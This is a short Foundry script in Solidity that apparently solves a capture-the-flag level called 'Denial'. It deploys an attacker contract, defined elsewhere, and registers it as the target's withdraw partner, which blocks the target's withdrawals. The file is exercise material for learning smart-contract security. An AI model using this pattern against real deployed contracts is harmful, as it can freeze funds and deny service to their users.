// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/20_Denial.sol";
import "contracts/20_Denial.sol";

contract AttackerDenialScript is Script {
    Denial denial = Denial(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        AttackerDenial attackerDenial = new AttackerDenial();
        denial.setWithdrawPartner(address(attackerDenial));
    }
}
